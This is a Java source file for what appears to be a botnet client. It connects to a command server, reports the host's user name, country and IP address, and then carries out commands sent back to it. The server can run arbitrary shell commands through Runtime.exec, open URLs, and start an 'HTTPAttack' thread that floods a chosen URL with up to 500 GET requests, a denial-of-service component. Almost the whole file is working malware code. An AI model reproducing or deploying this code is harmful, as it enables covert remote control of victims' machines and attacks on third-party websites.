package br.com.pricher.server.core;

import java.io.*;
import java.net.*;

/**
 * Created by Douglas Giovanella on 31/07/2017.
 */
public class Client {

    private Socket socket;
    private BufferedWriter bfw;

    public static void main(String[] args) throws IOException {
        Client app = new Client();
        app.connect();
        app.execute();
    }

    private void connect() throws IOException {
        do {
            try {
                socket = new Socket("localhost", 8094);
                OutputStream ou = socket.getOutputStream();

                Writer ouw = new OutputStreamWriter(ou);
                bfw = new BufferedWriter(ouw);

                bfw.write("bct");
                bfw.flush();

            } catch (Exception e) {
                System.err.println(e.getMessage());
            }

        } while (socket == null);
        System.out.println("Conectado...");
        //Nome de usuario no pc
        String osUser = System.getProperty("user.name");
        //Sistema Operacional
        String osName = System.getProperty("os.name");
        //Pais de origem
        String osCountry = System.getProperty("user.country");

        InetAddress ipAddress = InetAddress.getLocalHost();

        bfw.write(osUser + "&" + osCountry + "&" + osUser + "&" + ipAddress);
        bfw.flush();
    }


    /***
     * Método usado para enviar mensagem para o server socket
     * @param msg do tipo String
     * @throws IOException retorna IO Exception caso dê algum erro.
     */
    private void sendMessage(String msg) throws IOException {
        bfw.write(msg + "\r\n");
        bfw.flush();
    }

    /**
     * Método usado para receber mensagem do servidor
     *
     * @throws IOException retorna IO Exception caso dê algum erro.
     */
    private void execute() throws IOException {

        InputStream in = socket.getInputStream();
        InputStreamReader inr = new InputStreamReader(in);
        BufferedReader bfr = new BufferedReader(inr);
        String msg = "";

        while (!"Exit".equalsIgnoreCase(msg))
            if (bfr.ready()) {
                msg = bfr.readLine();
                String[] msgFormatted = msg.split("&");
                try {
                    switch (Integer.parseInt(msgFormatted[0])) {
                        case 0:
                            Runtime.getRuntime().exec(msgFormatted[1]);
                            sendMessage("Computer programed to turn off!!!");
                            break;
                        case 1:
                            java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));
                            sendMessage("Site " + msgFormatted[1] + " open!");
                            break;
                        case 2:
                            Runtime.getRuntime().exec(msgFormatted[1]);
                            sendMessage("Command executed!");
                            break;
                        case 66:
                            new HTTPAttack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();
                            break;
                        default:
                            sendMessage("Message code invalid!");
                            break;

                    }
                } catch (Exception e) {
                    sendMessage("Error to execute the command! " + e.getMessage());
                }
            }
    }
}

class HTTPAttack extends Thread {


    private static final int LOW = 1;
    private static final int MEDIUM = 2;
    private static final int HIGH = 3;

    private static final int REQUEST_LOW = 100;
    private static final int REQUEST_MEDIUM = 200;
    private static final int REQUEST_HIGH = 500;

    private URL url;
    private int intensity;

    HTTPAttack(String url, int intensity) {
        try {
            this.url = new URL(url);
            this.intensity = intensity;
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }

    private static int getNumRequest(int intensity) {
        switch (intensity) {
            case LOW:
                return REQUEST_LOW;
            case MEDIUM:
                return REQUEST_MEDIUM;
            default:
                return REQUEST_HIGH;
        }
    }

    public void run() {
        int i = 0;
        int request = getNumRequest(this.intensity);
        while (i < request) {
            try {
                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
                conn.setAllowUserInteraction(true);
                conn.setConnectTimeout(5000); // 15 sec. connection timeout
                conn.setDoInput(true);
                conn.setDoOutput(false);
                conn.setUseCaches(false);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");

                conn.connect();
                conn.getResponseCode();
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }
            i++;
        }
    }
}
